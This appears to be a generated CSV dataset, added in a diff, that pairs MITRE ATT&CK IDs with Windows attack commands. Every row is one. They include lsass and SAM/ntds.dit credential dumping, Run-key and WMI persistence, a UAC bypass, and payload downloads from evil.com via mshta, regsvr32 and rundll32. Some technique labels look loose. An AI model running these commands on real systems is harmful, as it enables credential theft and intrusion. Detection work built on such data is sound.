@@ -1,0 +1,841 @@
+mitre_id,command
+T1129,Import-Module -Name 'C:\Windows\Temp\debug.dll' -Function *
+T1087,quser /server:localhost
+T1003,Invoke-Mimikatz -Command 'lsadump::sam'
+T1546,"wmic /namespace:\\root\subscription PATH __EventFilter CREATE Name=""debug_filter"", EventNameSpace=""root\cimv2"""
+T1566,"rundll32.exe javascript:""\..\mshtml,RunHTMLApplication "";document.write();GetObject(""script:http://evil.com/debug.sct"")"
+T1016,arp -a
+T1112,"reg.exe add ""HKCU\Software\Classes\mscfile\shell\open\command"" /ve /t REG_SZ /d ""debug.exe"" /f"
+T1129,dotnet update_cache.dll
+T1087,net user /domain it_dept
+T1003,vssadmin create shadow /for=C:
+T1546,"wmic /namespace:\\root\subscription PATH __EventFilter CREATE Name=""update_cache_filter"", EventNameSpace=""root\cimv2"""
+T1566,"rundll32.exe javascript:""\..\mshtml,RunHTMLApplication "";document.write();GetObject(""script:http://evil.com/update_cache.sct"")"
+T1016,netsh interface show interface
+T1112,reg add HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated /t REG_DWORD /d 1 /f
+T1129,$dll = [System.Runtime.InteropServices.RuntimeInformation]::IsOSPlatform([System.Runtime.InteropServices.OSPlatform]::Windows)
+T1087,quser /server:localhost
+T1003,vssadmin create shadow /for=C:
+T1546,"wmic /namespace:\\root\subscription PATH __EventFilter CREATE Name=""update_cache_filter"", EventNameSpace=""root\cimv2"""
+T1566,"cmd.exe /c ""mshTa.exe http://evil.com/payload.hta"""
+T1016,ipconfig /all
+T1112,"reg.exe add ""HKCU\Software\Classes\mscfile\shell\open\command"" /ve /t REG_SZ /d ""update_cache.exe"" /f"
+T1129,regsvr32.exe /s /u /i:http://evil.com/payload.sct scrobj.dll
+T1087,net user /domain backup_user
+T1003,procdump.exe -ma lsass.exe payload.dmp
+T1546,"wmic /namespace:\\root\subscription PATH __EventFilter CREATE Name=""payload_filter"", EventNameSpace=""root\cimv2"""
+T1566,"rundll32.exe url.dll,OpenURL http://evil.com/payload.exe"
+T1016,ipconfig /all
+T1112,"reg.exe add ""HKCU\Software\Classes\mscfile\shell\open\command"" /ve /t REG_SZ /d ""payload.exe"" /f"
+T1129,"Add-Type -TypeDefinition @' [DllImport(""kernel32.dll"")] public static extern IntPtr LoadLibrary(string dll); '@ -Name 'Win32' -Namespace 'Genos'"
+T1087,dsquery user -name admin*
+T1003,reg save HKLM\SYSTEM C:\Windows\Temp\sys.hiv
+T1546,"reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v update /d ""rundll32.exe update.dll,EntryPoint"""
+T1566,"rundll32.exe javascript:""\..\mshtml,RunHTMLApplication "";document.write();GetObject(""script:http://evil.com/update.sct"")"
+T1016,netstat -ano | findstr LISTENING
+T1112,"reg.exe add ""HKCU\Software\Classes\mscfile\shell\open\command"" /ve /t REG_SZ /d ""update.exe"" /f"
+T1129,dotnet payload.dll
+T1087,net user /domain it_dept
+T1003,procdump.exe -ma lsass.exe payload.dmp
+T1546,"reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v payload /d ""rundll32.exe payload.dll,EntryPoint"""
+T1566,"rundll32.exe url.dll,OpenURL http://evil.com/payload.exe"
+T1016,route print
+T1112,reg add HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated /t REG_DWORD /d 1 /f
+T1129,dotnet payload.dll
+T1087,quser /server:localhost
+T1003,vssadmin create shadow /for=C:
+T1546,"reg add ""HKCU\Environment"" /v UserInitMprLogonScript /t REG_SZ /d ""rundll32.exe C:\temp\payload.dll,Run"""
+T1566,"rundll32.exe javascript:""\..\mshtml,RunHTMLApplication "";document.write();GetObject(""script:http://evil.com/payload.sct"")"
+T1016,arp -a
+T1112,reg add HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated /t REG_DWORD /d 1 /f
+T1129,regsvr32.exe /s /u /i:http://evil.com/update_cache.sct scrobj.dll
+T1087,net user /domain admin
+T1003,reg save HKLM\SYSTEM C:\Windows\Temp\sys.hiv
+T1546,"reg add ""HKCU\Environment"" /v UserInitMprLogonScript /t REG_SZ /d ""rundll32.exe C:\temp\update_cache.dll,Run"""
+T1566,"rundll32.exe url.dll,OpenURL http://evil.com/update_cache.exe"
+T1016,arp -a
+T1112,"reg.exe add ""HKCU\Software\Classes\mscfile\shell\open\command"" /ve /t REG_SZ /d ""update_cache.exe"" /f"
+T1129,"Add-Type -TypeDefinition @' [DllImport(""kernel32.dll"")] public static extern IntPtr LoadLibrary(string dll); '@ -Name 'Win32' -Namespace 'Genos'"
+T1087,quser /server:localhost
+T1003,pypykatz lsa minidump update.dmp
+T1546,"wmic /namespace:\\root\subscription PATH __EventFilter CREATE Name=""update_filter"", EventNameSpace=""root\cimv2"""
+T1566,"rundll32.exe url.dll,OpenURL http://evil.com/update.exe"
+T1016,netsh interface show interface
+T1112,"reg.exe add ""HKCU\Software\Classes\mscfile\shell\open\command"" /ve /t REG_SZ /d ""update.exe"" /f"
+T1129,"Add-Type -TypeDefinition @' [DllImport(""kernel32.dll"")] public static extern IntPtr LoadLibrary(string dll); '@ -Name 'Win32' -Namespace 'Genos'"
+T1087,dsquery user -name admin*
+T1003,reg save HKLM\SYSTEM C:\Windows\Temp\sys.hiv
+T1546,"reg add ""HKCU\Environment"" /v UserInitMprLogonScript /t REG_SZ /d ""rundll32.exe C:\temp\test.dll,Run"""
+T1566,"rundll32.exe javascript:""\..\mshtml,RunHTMLApplication "";document.write();GetObject(""script:http://evil.com/test.sct"")"
+T1016,arp -a
+T1112,"reg.exe add ""HKCU\Software\Classes\mscfile\shell\open\command"" /ve /t REG_SZ /d ""test.exe"" /f"
+T1129,dotnet sys_drv.dll
+T1087,"Get-ADUser -Filter * | Select-Object Name, SamAccountName"
+T1003,esentutl.exe /y /v /ss C:\Windows\ntds\ntds.dit /d C:\Windows\Temp\ntds.dit
+T1546,"reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v sys_drv /d ""rundll32.exe sys_drv.dll,EntryPoint"""
+T1566,"rundll32.exe javascript:""\..\mshtml,RunHTMLApplication "";document.write();GetObject(""script:http://evil.com/sys_drv.sct"")"
+T1016,ipconfig /all
+T1112,reg add HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated /t REG_DWORD /d 1 /f
+T1129,regsvr32.exe /s /u /i:http://evil.com/update_cache.sct scrobj.dll
+T1087,Get-LocalUser | Where-Object { $_.Enabled -eq $true }
+T1003,procdump.exe -ma lsass.exe update_cache.dmp
+T1546,"reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v update_cache /d ""rundll32.exe update_cache.dll,EntryPoint"""
+T1566,"cmd.exe /c ""mshTa.exe http://evil.com/payload.hta"""
+T1016,netstat -ano | findstr LISTENING
+T1112,"reg.exe add ""HKCU\Software\Classes\mscfile\shell\open\command"" /ve /t REG_SZ /d ""update_cache.exe"" /f"
+T1129,Import-Module -Name 'C:\Windows\Temp\payload.dll' -Function *
+T1087,net user /domain admin
+T1003,reg save HKLM\SAM C:\Windows\Temp\sam.hiv
+T1546,"wmic /namespace:\\root\subscription PATH __EventFilter CREATE Name=""payload_filter"", EventNameSpace=""root\cimv2"""
+T1566,"rundll32.exe javascript:""\..\mshtml,RunHTMLApplication "";document.write();GetObject(""script:http://evil.com/payload.sct"")"
+T1016,ipconfig /all
+T1112,"reg.exe add ""HKCU\Software\Classes\mscfile\shell\open\command"" /ve /t REG_SZ /d ""payload.exe"" /f"
+T1129,regsvr32.exe /s /u /i:http://evil.com/payload.sct scrobj.dll
+T1087,Get-LocalUser | Where-Object { $_.Enabled -eq $true }
+T1003,vssadmin create shadow /for=C:
+T1546,"wmic /namespace:\\root\subscription PATH __EventFilter CREATE Name=""payload_filter"", EventNameSpace=""root\cimv2"""
+T1566,"rundll32.exe url.dll,OpenURL http://evil.com/payload.exe"
+T1016,netstat -ano | findstr LISTENING
+T1112,"reg.exe add ""HKCU\Software\Classes\mscfile\shell\open\command"" /ve /t REG_SZ /d ""payload.exe"" /f"
+T1129,Import-Module -Name 'C:\Windows\Temp\sys_drv.dll' -Function *
+T1087,dsquery user -name admin*
+T1003,pypykatz lsa minidump sys_drv.dmp
+T1546,"wmic /namespace:\\root\subscription PATH __EventFilter CREATE Name=""sys_drv_filter"", EventNameSpace=""root\cimv2"""
+T1566,"rundll32.exe url.dll,OpenURL http://evil.com/sys_drv.exe"
+T1016,arp -a
+T1112,reg add HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated /t REG_DWORD /d 1 /f
+T1129,$dll = [System.Runtime.InteropServices.RuntimeInformation]::IsOSPlatform([System.Runtime.InteropServices.OSPlatform]::Windows)
+T1087,dsquery user -name backup_user*
+T1003,Invoke-Mimikatz -Command 'lsadump::sam'
+T1546,"reg add ""HKCU\Environment"" /v UserInitMprLogonScript /t REG_SZ /d ""rundll32.exe C:\temp\sys_drv.dll,Run"""
+T1566,"cmd.exe /c ""mshTa.exe http://evil.com/payload.hta"""
+T1016,route print
+T1112,"reg.exe add ""HKCU\Software\Classes\mscfile\shell\open\command"" /ve /t REG_SZ /d ""sys_drv.exe"" /f"
+T1129,dnx.exe payload.dll
+T1087,Get-LocalUser | Where-Object { $_.Enabled -eq $true }
+T1003,reg save HKLM\SYSTEM C:\Windows\Temp\sys.hiv
+T1546,"reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v payload /d ""rundll32.exe payload.dll,EntryPoint"""
+T1566,"rundll32.exe javascript:""\..\mshtml,RunHTMLApplication "";document.write();GetObject(""script:http://evil.com/payload.sct"")"
+T1016,ipconfig /all
+T1112,"reg.exe add ""HKCU\Software\Classes\mscfile\shell\open\command"" /ve /t REG_SZ /d ""payload.exe"" /f"
+T1129,"Add-Type -TypeDefinition @' [DllImport(""kernel32.dll"")] public static extern IntPtr LoadLibrary(string dll); '@ -Name 'Win32' -Namespace 'Genos'"
+T1087,cmd /c 'whoami /groups & whoami /priv'
+T1003,"rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump 6294 C:\Windows\Temp\lsass.dmp full"
+T1546,"reg add ""HKCU\Environment"" /v UserInitMprLogonScript /t REG_SZ /d ""rundll32.exe C:\temp\svc_helper.dll,Run"""
+T1566,"rundll32.exe javascript:""\..\mshtml,RunHTMLApplication "";document.write();GetObject(""script:http://evil.com/svc_helper.sct"")"
+T1016,route print
+T1112,"reg.exe add ""HKCU\Software\Classes\mscfile\shell\open\command"" /ve /t REG_SZ /d ""svc_helper.exe"" /f"
+T1129,dnx.exe sys_drv.dll
+T1087,"Get-ADUser -Filter * | Select-Object Name, SamAccountName"
+T1003,reg save HKLM\SYSTEM C:\Windows\Temp\sys.hiv
+T1546,"reg add ""HKCU\Environment"" /v UserInitMprLogonScript /t REG_SZ /d ""rundll32.exe C:\temp\sys_drv.dll,Run"""
+T1566,"cmd.exe /c ""mshTa.exe http://evil.com/payload.hta"""
+T1016,arp -a
+T1112,reg add HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated /t REG_DWORD /d 1 /f
+T1129,regsvr32.exe /s /u /i:http://evil.com/sys_drv.sct scrobj.dll
+T1087,dsquery user -name admin*
+T1003,procdump.exe -ma lsass.exe sys_drv.dmp
+T1546,"wmic /namespace:\\root\subscription PATH __EventFilter CREATE Name=""sys_drv_filter"", EventNameSpace=""root\cimv2"""
+T1566,"cmd.exe /c ""mshTa.exe http://evil.com/payload.hta"""
+T1016,arp -a
+T1112,"reg.exe add ""HKCU\Software\Classes\mscfile\shell\open\command"" /ve /t REG_SZ /d ""sys_drv.exe"" /f"
+T1129,$dll = [System.Runtime.InteropServices.RuntimeInformation]::IsOSPlatform([System.Runtime.InteropServices.OSPlatform]::Windows)
+T1087,net localgroup administrators
+T1003,esentutl.exe /y /v /ss C:\Windows\ntds\ntds.dit /d C:\Windows\Temp\ntds.dit
+T1546,"reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v update /d ""rundll32.exe update.dll,EntryPoint"""
+T1566,"rundll32.exe url.dll,OpenURL http://evil.com/update.exe"
+T1016,netstat -ano | findstr LISTENING
+T1112,"reg.exe add ""HKCU\Software\Classes\mscfile\shell\open\command"" /ve /t REG_SZ /d ""update.exe"" /f"
+T1129,"Add-Type -TypeDefinition @' [DllImport(""kernel32.dll"")] public static extern IntPtr LoadLibrary(string dll); '@ -Name 'Win32' -Namespace 'Genos'"
+T1087,net localgroup administrators
+T1003,esentutl.exe /y /v /ss C:\Windows\ntds\ntds.dit /d C:\Windows\Temp\ntds.dit
+T1546,"reg add ""HKCU\Environment"" /v UserInitMprLogonScript /t REG_SZ /d ""rundll32.exe C:\temp\update.dll,Run"""
+T1566,"rundll32.exe url.dll,OpenURL http://evil.com/update.exe"
+T1016,netsh interface show interface
+T1112,"reg.exe add ""HKCU\Software\Classes\mscfile\shell\open\command"" /ve /t REG_SZ /d ""update.exe"" /f"
+T1129,[Reflection.Assembly]::LoadFile('C:\Users\Public\svc_helper.dll')
+T1087,net user /domain backup_user
+T1003,Invoke-Mimikatz -Command 'lsadump::sam'
+T1546,"reg add ""HKCU\Environment"" /v UserInitMprLogonScript /t REG_SZ /d ""rundll32.exe C:\temp\svc_helper.dll,Run"""
+T1566,"rundll32.exe javascript:""\..\mshtml,RunHTMLApplication "";document.write();GetObject(""script:http://evil.com/svc_helper.sct"")"
+T1016,netstat -ano | findstr LISTENING
+T1112,reg add HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated /t REG_DWORD /d 1 /f
+T1129,[Reflection.Assembly]::LoadFile('C:\Users\Public\payload.dll')
+T1087,Get-LocalUser | Where-Object { $_.Enabled -eq $true }
+T1003,reg save HKLM\SAM C:\Windows\Temp\sam.hiv
+T1546,"wmic /namespace:\\root\subscription PATH __EventFilter CREATE Name=""payload_filter"", EventNameSpace=""root\cimv2"""
+T1566,"rundll32.exe url.dll,OpenURL http://evil.com/payload.exe"
+T1016,ipconfig /all
+T1112,reg add HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated /t REG_DWORD /d 1 /f
+T1129,"Add-Type -TypeDefinition @' [DllImport(""kernel32.dll"")] public static extern IntPtr LoadLibrary(string dll); '@ -Name 'Win32' -Namespace 'Genos'"
+T1087,"wmic useraccount get name,sid"
+T1003,"rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump 8687 C:\Windows\Temp\lsass.dmp full"
+T1546,"reg add ""HKCU\Environment"" /v UserInitMprLogonScript /t REG_SZ /d ""rundll32.exe C:\temp\payload.dll,Run"""
+T1566,"rundll32.exe javascript:""\..\mshtml,RunHTMLApplication "";document.write();GetObject(""script:http://evil.com/payload.sct"")"
+T1016,ipconfig /all
+T1112,"reg.exe add ""HKCU\Software\Classes\mscfile\shell\open\command"" /ve /t REG_SZ /d ""payload.exe"" /f"
+T1129,"rundll32.exe update.dll, Execute"
+T1087,Get-LocalUser | Where-Object { $_.Enabled -eq $true }
+T1003,reg save HKLM\SYSTEM C:\Windows\Temp\sys.hiv
+T1546,"wmic /namespace:\\root\subscription PATH __EventFilter CREATE Name=""update_filter"", EventNameSpace=""root\cimv2"""
+T1566,"rundll32.exe url.dll,OpenURL http://evil.com/update.exe"
+T1016,netstat -ano | findstr LISTENING
+T1112,"reg.exe add ""HKCU\Software\Classes\mscfile\shell\open\command"" /ve /t REG_SZ /d ""update.exe"" /f"
+T1129,$dll = [System.Runtime.InteropServices.RuntimeInformation]::IsOSPlatform([System.Runtime.InteropServices.OSPlatform]::Windows)
+T1087,"wmic useraccount get name,sid"
+T1003,vssadmin create shadow /for=C:
+T1546,"reg add ""HKCU\Environment"" /v UserInitMprLogonScript /t REG_SZ /d ""rundll32.exe C:\temp\payload.dll,Run"""
+T1566,"rundll32.exe url.dll,OpenURL http://evil.com/payload.exe"
+T1016,ipconfig /all
+T1112,reg add HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated /t REG_DWORD /d 1 /f
+T1129,"rundll32.exe update_cache.dll, Execute"
+T1087,quser /server:localhost
+T1003,reg save HKLM\SYSTEM C:\Windows\Temp\sys.hiv
+T1546,"reg add ""HKCU\Environment"" /v UserInitMprLogonScript /t REG_SZ /d ""rundll32.exe C:\temp\update_cache.dll,Run"""
+T1566,"rundll32.exe url.dll,OpenURL http://evil.com/update_cache.exe"
+T1016,netsh interface show interface
+T1112,"reg.exe add ""HKCU\Software\Classes\mscfile\shell\open\command"" /ve /t REG_SZ /d ""update_cache.exe"" /f"
+T1129,regsvr32.exe /s /u /i:http://evil.com/debug.sct scrobj.dll
+T1087,net user /domain svc_sql
+T1003,Invoke-Mimikatz -Command 'lsadump::sam'
+T1546,"wmic /namespace:\\root\subscription PATH __EventFilter CREATE Name=""debug_filter"", EventNameSpace=""root\cimv2"""
+T1566,"cmd.exe /c ""mshTa.exe http://evil.com/payload.hta"""
+T1016,ipconfig /all
+T1112,reg add HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated /t REG_DWORD /d 1 /f
+T1129,dotnet update_cache.dll
+T1087,net localgroup administrators
+T1003,reg save HKLM\SYSTEM C:\Windows\Temp\sys.hiv
+T1546,"wmic /namespace:\\root\subscription PATH __EventFilter CREATE Name=""update_cache_filter"", EventNameSpace=""root\cimv2"""
+T1566,"rundll32.exe url.dll,OpenURL http://evil.com/update_cache.exe"
+T1016,netsh interface show interface
+T1112,"reg.exe add ""HKCU\Software\Classes\mscfile\shell\open\command"" /ve /t REG_SZ /d ""update_cache.exe"" /f"
+T1129,regsvr32.exe /s /u /i:http://evil.com/sys_drv.sct scrobj.dll
+T1087,"Get-ADUser -Filter * | Select-Object Name, SamAccountName"
+T1003,"rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump 6351 C:\Windows\Temp\lsass.dmp full"
+T1546,"wmic /namespace:\\root\subscription PATH __EventFilter CREATE Name=""sys_drv_filter"", EventNameSpace=""root\cimv2"""
+T1566,"cmd.exe /c ""mshTa.exe http://evil.com/payload.hta"""
+T1016,route print
+T1112,reg add HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated /t REG_DWORD /d 1 /f
+T1129,regsvr32.exe /s /u /i:http://evil.com/update.sct scrobj.dll
+T1087,quser /server:localhost
+T1003,pypykatz lsa minidump update.dmp
+T1546,"wmic /namespace:\\root\subscription PATH __EventFilter CREATE Name=""update_filter"", EventNameSpace=""root\cimv2"""
+T1566,"rundll32.exe url.dll,OpenURL http://evil.com/update.exe"
+T1016,netstat -ano | findstr LISTENING
+T1112,reg add HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated /t REG_DWORD /d 1 /f
+T1129,$dll = [System.Runtime.InteropServices.RuntimeInformation]::IsOSPlatform([System.Runtime.InteropServices.OSPlatform]::Windows)
+T1087,"wmic useraccount get name,sid"
+T1003,reg save HKLM\SAM C:\Windows\Temp\sam.hiv
+T1546,"wmic /namespace:\\root\subscription PATH __EventFilter CREATE Name=""sys_drv_filter"", EventNameSpace=""root\cimv2"""
+T1566,"cmd.exe /c ""mshTa.exe http://evil.com/payload.hta"""
+T1016,route print
+T1112,reg add HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated /t REG_DWORD /d 1 /f
+T1129,[Reflection.Assembly]::LoadFile('C:\Users\Public\update.dll')
+T1087,dsquery user -name backup_user*
+T1003,procdump.exe -ma lsass.exe update.dmp
+T1546,"reg add ""HKCU\Environment"" /v UserInitMprLogonScript /t REG_SZ /d ""rundll32.exe C:\temp\update.dll,Run"""
+T1566,"rundll32.exe url.dll,OpenURL http://evil.com/update.exe"
+T1016,route print
+T1112,reg add HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated /t REG_DWORD /d 1 /f
+T1129,Import-Module -Name 'C:\Windows\Temp\sys_drv.dll' -Function *
+T1087,"wmic useraccount get name,sid"
+T1003,esentutl.exe /y /v /ss C:\Windows\ntds\ntds.dit /d C:\Windows\Temp\ntds.dit
+T1546,"wmic /namespace:\\root\subscription PATH __EventFilter CREATE Name=""sys_drv_filter"", EventNameSpace=""root\cimv2"""
+T1566,"rundll32.exe url.dll,OpenURL http://evil.com/sys_drv.exe"
+T1016,netstat -ano | findstr LISTENING
+T1112,reg add HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated /t REG_DWORD /d 1 /f
+T1129,Import-Module -Name 'C:\Windows\Temp\sys_drv.dll' -Function *
+T1087,"Get-ADUser -Filter * | Select-Object Name, SamAccountName"
+T1003,procdump.exe -ma lsass.exe sys_drv.dmp
+T1546,"reg add ""HKCU\Environment"" /v UserInitMprLogonScript /t REG_SZ /d ""rundll32.exe C:\temp\sys_drv.dll,Run"""
+T1566,"cmd.exe /c ""mshTa.exe http://evil.com/payload.hta"""
+T1016,arp -a
+T1112,reg add HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated /t REG_DWORD /d 1 /f
+T1129,dotnet sys_drv.dll
+T1087,"wmic useraccount get name,sid"
+T1003,vssadmin create shadow /for=C:
+T1546,"wmic /namespace:\\root\subscription PATH __EventFilter CREATE Name=""sys_drv_filter"", EventNameSpace=""root\cimv2"""
+T1566,"rundll32.exe url.dll,OpenURL http://evil.com/sys_drv.exe"
+T1016,ipconfig /all
+T1112,"reg.exe add ""HKCU\Software\Classes\mscfile\shell\open\command"" /ve /t REG_SZ /d ""sys_drv.exe"" /f"
+T1129,regsvr32.exe /s /u /i:http://evil.com/payload.sct scrobj.dll
+T1087,quser /server:localhost
+T1003,esentutl.exe /y /v /ss C:\Windows\ntds\ntds.dit /d C:\Windows\Temp\ntds.dit
+T1546,"wmic /namespace:\\root\subscription PATH __EventFilter CREATE Name=""payload_filter"", EventNameSpace=""root\cimv2"""
+T1566,"rundll32.exe url.dll,OpenURL http://evil.com/payload.exe"
+T1016,arp -a
+T1112,"reg.exe add ""HKCU\Software\Classes\mscfile\shell\open\command"" /ve /t REG_SZ /d ""payload.exe"" /f"
+T1129,Import-Module -Name 'C:\Windows\Temp\payload.dll' -Function *
+T1087,dsquery user -name it_dept*
+T1003,procdump.exe -ma lsass.exe payload.dmp
+T1546,"reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v payload /d ""rundll32.exe payload.dll,EntryPoint"""
+T1566,"rundll32.exe javascript:""\..\mshtml,RunHTMLApplication "";document.write();GetObject(""script:http://evil.com/payload.sct"")"
+T1016,ipconfig /all
+T1112,reg add HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated /t REG_DWORD /d 1 /f
+T1129,dotnet svc_helper.dll
+T1087,"Get-ADUser -Filter * | Select-Object Name, SamAccountName"
+T1003,reg save HKLM\SAM C:\Windows\Temp\sam.hiv
+T1546,"wmic /namespace:\\root\subscription PATH __EventFilter CREATE Name=""svc_helper_filter"", EventNameSpace=""root\cimv2"""
+T1566,"rundll32.exe javascript:""\..\mshtml,RunHTMLApplication "";document.write();GetObject(""script:http://evil.com/svc_helper.sct"")"
+T1016,netsh interface show interface
+T1112,reg add HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated /t REG_DWORD /d 1 /f
+T1129,Import-Module -Name 'C:\Windows\Temp\test.dll' -Function *
+T1087,Get-LocalUser | Where-Object { $_.Enabled -eq $true }
+T1003,"rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump 6129 C:\Windows\Temp\lsass.dmp full"
+T1546,"wmic /namespace:\\root\subscription PATH __EventFilter CREATE Name=""test_filter"", EventNameSpace=""root\cimv2"""
+T1566,"rundll32.exe javascript:""\..\mshtml,RunHTMLApplication "";document.write();GetObject(""script:http://evil.com/test.sct"")"
+T1016,netsh interface show interface
+T1112,reg add HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated /t REG_DWORD /d 1 /f
+T1129,[Reflection.Assembly]::LoadFile('C:\Users\Public\svc_helper.dll')
+T1087,"wmic useraccount get name,sid"
+T1003,reg save HKLM\SAM C:\Windows\Temp\sam.hiv
+T1546,"reg add ""HKCU\Environment"" /v UserInitMprLogonScript /t REG_SZ /d ""rundll32.exe C:\temp\svc_helper.dll,Run"""
+T1566,"rundll32.exe javascript:""\..\mshtml,RunHTMLApplication "";document.write();GetObject(""script:http://evil.com/svc_helper.sct"")"
+T1016,netsh interface show interface
+T1112,reg add HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated /t REG_DWORD /d 1 /f
+T1129,$dll = [System.Runtime.InteropServices.RuntimeInformation]::IsOSPlatform([System.Runtime.InteropServices.OSPlatform]::Windows)
+T1087,net localgroup administrators
+T1003,reg save HKLM\SYSTEM C:\Windows\Temp\sys.hiv
+T1546,"reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v update /d ""rundll32.exe update.dll,EntryPoint"""
+T1566,"rundll32.exe url.dll,OpenURL http://evil.com/update.exe"
+T1016,arp -a
+T1112,"reg.exe add ""HKCU\Software\Classes\mscfile\shell\open\command"" /ve /t REG_SZ /d ""update.exe"" /f"
+T1129,regsvr32.exe /s /u /i:http://evil.com/test.sct scrobj.dll
+T1087,"Get-ADUser -Filter * | Select-Object Name, SamAccountName"
+T1003,esentutl.exe /y /v /ss C:\Windows\ntds\ntds.dit /d C:\Windows\Temp\ntds.dit
+T1546,"wmic /namespace:\\root\subscription PATH __EventFilter CREATE Name=""test_filter"", EventNameSpace=""root\cimv2"""
+T1566,"cmd.exe /c ""mshTa.exe http://evil.com/payload.hta"""
+T1016,ipconfig /all
+T1112,reg add HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated /t REG_DWORD /d 1 /f
+T1129,$dll = [System.Runtime.InteropServices.RuntimeInformation]::IsOSPlatform([System.Runtime.InteropServices.OSPlatform]::Windows)
+T1087,dsquery user -name admin*
+T1003,reg save HKLM\SAM C:\Windows\Temp\sam.hiv
+T1546,"reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v update_cache /d ""rundll32.exe update_cache.dll,EntryPoint"""
+T1566,"rundll32.exe javascript:""\..\mshtml,RunHTMLApplication "";document.write();GetObject(""script:http://evil.com/update_cache.sct"")"
+T1016,route print
+T1112,reg add HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated /t REG_DWORD /d 1 /f
+T1129,dnx.exe payload.dll
+T1087,Get-LocalUser | Where-Object { $_.Enabled -eq $true }
+T1003,Invoke-Mimikatz -Command 'lsadump::sam'
+T1546,"wmic /namespace:\\root\subscription PATH __EventFilter CREATE Name=""payload_filter"", EventNameSpace=""root\cimv2"""
+T1566,"rundll32.exe url.dll,OpenURL http://evil.com/payload.exe"
+T1016,route print
+T1112,reg add HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated /t REG_DWORD /d 1 /f
+T1129,dotnet payload.dll
+T1087,Get-LocalUser | Where-Object { $_.Enabled -eq $true }
+T1003,pypykatz lsa minidump payload.dmp
+T1546,"wmic /namespace:\\root\subscription PATH __EventFilter CREATE Name=""payload_filter"", EventNameSpace=""root\cimv2"""
+T1566,"rundll32.exe javascript:""\..\mshtml,RunHTMLApplication "";document.write();GetObject(""script:http://evil.com/payload.sct"")"
+T1016,ipconfig /all
+T1112,"reg.exe add ""HKCU\Software\Classes\mscfile\shell\open\command"" /ve /t REG_SZ /d ""payload.exe"" /f"
+T1129,"Add-Type -TypeDefinition @' [DllImport(""kernel32.dll"")] public static extern IntPtr LoadLibrary(string dll); '@ -Name 'Win32' -Namespace 'Genos'"
+T1087,cmd /c 'whoami /groups & whoami /priv'
+T1003,pypykatz lsa minidump debug.dmp
+T1546,"wmic /namespace:\\root\subscription PATH __EventFilter CREATE Name=""debug_filter"", EventNameSpace=""root\cimv2"""
+T1566,"rundll32.exe javascript:""\..\mshtml,RunHTMLApplication "";document.write();GetObject(""script:http://evil.com/debug.sct"")"
+T1016,netstat -ano | findstr LISTENING
+T1112,reg add HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated /t REG_DWORD /d 1 /f
+T1129,"Add-Type -TypeDefinition @' [DllImport(""kernel32.dll"")] public static extern IntPtr LoadLibrary(string dll); '@ -Name 'Win32' -Namespace 'Genos'"
+T1087,dsquery user -name it_dept*
+T1003,reg save HKLM\SAM C:\Windows\Temp\sam.hiv
+T1546,"reg add ""HKCU\Environment"" /v UserInitMprLogonScript /t REG_SZ /d ""rundll32.exe C:\temp\update.dll,Run"""
+T1566,"rundll32.exe javascript:""\..\mshtml,RunHTMLApplication "";document.write();GetObject(""script:http://evil.com/update.sct"")"
+T1016,netstat -ano | findstr LISTENING
+T1112,"reg.exe add ""HKCU\Software\Classes\mscfile\shell\open\command"" /ve /t REG_SZ /d ""update.exe"" /f"
+T1129,Import-Module -Name 'C:\Windows\Temp\update.dll' -Function *
+T1087,cmd /c 'whoami /groups & whoami /priv'
+T1003,esentutl.exe /y /v /ss C:\Windows\ntds\ntds.dit /d C:\Windows\Temp\ntds.dit
+T1546,"wmic /namespace:\\root\subscription PATH __EventFilter CREATE Name=""update_filter"", EventNameSpace=""root\cimv2"""
+T1566,"rundll32.exe url.dll,OpenURL http://evil.com/update.exe"
+T1016,netstat -ano | findstr LISTENING
+T1112,reg add HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated /t REG_DWORD /d 1 /f
+T1129,"rundll32.exe payload.dll, Execute"
+T1087,cmd /c 'whoami /groups & whoami /priv'
+T1003,"rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump 6474 C:\Windows\Temp\lsass.dmp full"
